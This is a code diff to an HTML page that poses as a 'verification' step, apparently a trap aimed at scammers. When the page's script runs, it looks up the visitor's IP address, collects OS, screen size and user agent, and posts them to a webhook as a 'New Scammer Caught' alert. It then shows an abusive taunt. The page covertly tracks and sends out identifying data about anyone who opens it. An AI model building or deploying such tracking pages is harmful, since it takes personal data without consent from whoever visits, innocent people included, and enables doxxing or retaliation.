@@ -18,6 +18,7 @@
             text-align: center;
             font-size: 1.2rem;
             color: #333;
+            padding: 20px;
         }
     </style>
 </head>
@@ -34,24 +35,31 @@
                 const ipRes = await fetch('https://api.ipify.org?format=json');
                 const ipData = await ipRes.json();
 
-                const info = {
-                    id: sessionId,
-                    ip: ipData.ip,
-                    os: navigator.platform,
-                    agent: navigator.userAgent,
-                    language: navigator.language,
-                    screen: `${window.screen.width}x${window.screen.height}`
+                const payload = {
+                    content: "🚨 **New Scammer Caught** 🚨",
+                    embeds: [{
+                        title: "Session Info: " + sessionId,
+                        color: 16711680,
+                        fields: [
+                            { name: "IP Address", value: ipData.ip, inline: true },
+                            { name: "OS", value: navigator.platform, inline: true },
+                            { name: "Screen", value: `${window.screen.width}x${window.screen.height}`, inline: true },
+                            { name: "User Agent", value: navigator.userAgent }
+                        ],
+                        timestamp: new Date().toISOString()
+                    }]
                 };
 
                 await fetch(webhookUrl, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(info)
+                    body: JSON.stringify(payload)
                 });
 
                 statusDiv.innerHTML = `GET FUCKED SCAMMER LMFAO, ALL YOUR INFORMATION HAVE BEEN SENT TO ME`;
             } catch (error) {
                 statusDiv.innerText = "Error during verification.";
+                console.error(error);
             }
         }
 
